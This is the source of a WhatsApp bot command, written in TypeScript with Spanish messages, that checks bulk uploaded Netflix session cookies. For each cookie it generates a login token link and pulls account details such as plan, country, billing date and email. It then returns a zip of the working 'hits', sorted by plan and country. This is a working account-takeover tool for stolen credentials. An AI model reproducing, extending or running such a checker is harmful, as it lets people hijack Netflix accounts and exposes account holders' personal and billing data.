import JSZip from 'jszip'
import {
  extractCookiesFromBlock,
  buildCookieString,
  generateToken,
  getMetadata,
  getPlanType,
  getProgressBar,
} from '../../lib/netflix.js'

function formatResult(cookieStr: string, link: string, meta: any): string {
  let c = `🍪 Netflix Cookie\n`
  c += `-----------------------------------------------------\n`
  c += `${cookieStr}\n`
  c += `-----------------------------------------------------\n`
  c += `🧃 Información\n\n`
  if (meta?.country) c += `🌍 País: ${meta.country}\n`
  if (meta?.plan) c += `💎 Plan: ${meta.plan}\n`
  if (meta?.videoQuality) c += `📺 Calidad: ${meta.videoQuality}\n`
  if (meta?.nextBillingDate) c += `📅 Próximo cobro: ${meta.nextBillingDate}\n`
  if (meta?.memberSince) c += `🗓️ Miembro desde: ${meta.memberSince}\n`
  if (meta?.email) c += `📧 Email: ${meta.email}\n`
  c += `\n-----------------------------------------------------\n`
  c += `🔗 NFToken: ${link}\n`
  c += `-----------------------------------------------------\n`
  return c
}

export default {
  command: ['nfchk', 'chk'],
  description: 'Verifica archivo .txt/.zip de cookies Netflix',
  category: 'tools',
  run: async (sock: any, m: any, { prefix }: any) => {
    const msg = m.message
    const hasDocument =
      msg?.documentMessage ||
      msg?.documentWithCaptionMessage?.message?.documentMessage

    if (!hasDocument) {
      await sock.sendMessage(m.chat, {
        text: `*Uso:* ${prefix}nfchk\n\nEnvía este comando junto con un archivo *.txt* o *.zip* con cookies de Netflix.\n\n*Formatos:* Netscape, JSON, Raw`,
      }, { quoted: m })
      return
    }

    await sock.sendMessage(m.chat, { react: { text: '📥', key: m.key } })

    let fileBuffer: Buffer
    try {
      const stream = await sock.downloadMediaMessage(m)
      const chunks: Buffer[] = []
      for await (const chunk of stream) chunks.push(chunk)
      fileBuffer = Buffer.concat(chunks)
    } catch {
      await sock.sendMessage(m.chat, { text: '❌ No pude descargar el archivo.' }, { quoted: m })
      return
    }

    const content = fileBuffer.toString('utf-8')
    const cookiesList = extractCookiesFromBlock(content)

    if (!cookiesList.length) {
      await sock.sendMessage(m.chat, {
        text: '⚠️ No se encontraron cookies válidas en el archivo.',
      }, { quoted: m })
      return
    }

    const total = cookiesList.length
    const statusMsg = await sock.sendMessage(m.chat, {
      text: `🔍 *Iniciando verificación...*\nTotal: *${total}* cookies`,
    }, { quoted: m })

    let hits = 0
    let fails = 0
    const validResults: Array<{ cookieStr: string; link: string; meta: any }> = []

    for (let i = 0; i < cookiesList.length; i++) {
      if (i % 3 === 0 || i === total - 1) {
        const bar = getProgressBar(i, total)
        await sock.sendMessage(m.chat, {
          text: `⚡ *Verificando...*\n${bar}\nProcesados: ${i}/${total}\n✅ Hits: ${hits} | ❌ Fails: ${fails}`,
          edit: statusMsg.key,
        })
      }

      const cd = cookiesList[i]
      const tokenResult = await generateToken(cd)

      if (tokenResult.ok && tokenResult.token) {
        hits++
        const meta = await getMetadata(cd)
        validResults.push({
          cookieStr: buildCookieString(cd),
          link: tokenResult.link!,
          meta,
        })
      } else {
        fails++
      }

      if (i % 5 === 0) await new Promise(r => setTimeout(r, 300))
    }

    await sock.sendMessage(m.chat, {
      text: `✅ *PROCESO COMPLETADO*\n\n├ 📊 Total: \`${total}\`\n├ ✨ Hits: \`${hits}\`\n└ 💀 Fails: \`${fails}\``,
      edit: statusMsg.key,
    })

    if (!validResults.length) {
      await sock.sendMessage(m.chat, { text: '💀 No se encontraron cookies válidas.' }, { quoted: m })
      await sock.sendMessage(m.chat, { react: { text: '❌', key: m.key } })
      return
    }

    const zip = new JSZip()
    validResults.forEach((r, idx) => {
      const plan = getPlanType(r.meta?.plan)
      const country = r.meta?.country || 'XX'
      const filename = `[${plan}] [${country}] [${String(idx + 1).padStart(4, '0')}] Netflix.txt`
      zip.file(filename, formatResult(r.cookieStr, r.link, r.meta))
    })

    const zipBuffer = await zip.generateAsync({ type: 'nodebuffer', compression: 'DEFLATE' })
    const timestamp = new Date().toISOString().replace(/[:.]/g, '').slice(0, 15)

    await sock.sendMessage(m.chat, {
      document: zipBuffer,
      fileName: `Netflix_Checked_${timestamp}.zip`,
      mimetype: 'application/zip',
      caption: `📦 *${hits} cuentas válidas*\nFormato: \`[Plan] [PAIS] [XXXX] Netflix.txt\``,
    }, { quoted: m })

    await sock.sendMessage(m.chat, { react: { text: '✅', key: m.key } })
  },
}
